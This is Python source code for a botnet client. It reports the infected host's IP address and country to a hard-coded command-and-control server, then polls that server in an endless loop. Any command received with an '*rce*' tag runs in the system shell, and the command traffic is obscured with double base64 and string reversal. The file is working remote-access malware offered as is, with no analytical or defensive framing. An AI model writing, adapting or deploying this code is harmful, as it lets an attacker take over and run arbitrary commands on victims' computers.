import base64
import time
import requests
import os
from os import system, name
import json
import html

cnc_server = "https://net.cloudcant.repl.co"


def getinfo(type):
  response = requests.get('http://ifconfig.net/json')
  infojson = html.unescape(response.text)
  info = json.loads(infojson)
  return info[type]


botinfo = f"{getinfo('ip')}@{getinfo('country')}"
requests.get(f"{cnc_server}/bot?connect={botinfo}")


def clear():
  # for windows
  if name == 'nt':
    _ = system('cls')
  # for mac and linux(here, os.name is 'posix')
  else:
    _ = system('clear')


def b64_encode(input):
  input_ascii = input.encode("ascii")
  input_b64_raw = base64.b64encode(input_ascii)
  input_b64 = input_b64_raw.decode("ascii")
  return input_b64


def b64_decode(string):
  string_ascii = string.encode("ascii")
  string_decoded_raw = base64.b64decode(string_ascii)
  string_decoded = string_decoded_raw.decode("ascii")
  return string_decoded


def reverse(input):
  return input[::-1]


def encode(string):
  step1 = b64_encode(string)
  step2 = reverse(step1)
  output = b64_encode(step2)
  return output


def decode(string):
  step4 = b64_decode(string)
  step5 = reverse(step4)
  output = b64_decode(step5)
  return output


def getcommand():
  global cnc_server
  cnc = requests.get(f"{cnc_server}/bot")
  command = html.unescape(cnc.text)
  return command


def getcheck():
  cnc_check = requests.get(f"{cnc_server}/bot?check")
  check = html.unescape(cnc_check.text)
  return check


def log(check):
  global command
  command = getcommand()
  clear()
  print(f"""
  {botinfo}
  ├── {cnc_server}/bot
  │   ├── {encode(command)}
  │   └── {decode(command)}
  ├── {cnc_server}/bot?check
  │   ├── {encode(check)}
  │   └── {check}\n""")


while True:
  status = decode(getcheck())
  if status == "listen":
    log("Listen")
    if "*rce*" in decode(command):
      os.system(str((decode(command)).replace('*rce*', '')))
    else:
      pass
    time.sleep(2)
  elif status == "off":
    log("Off")
    time.sleep(2)
  else:
    log("err")
    time.sleep(2)
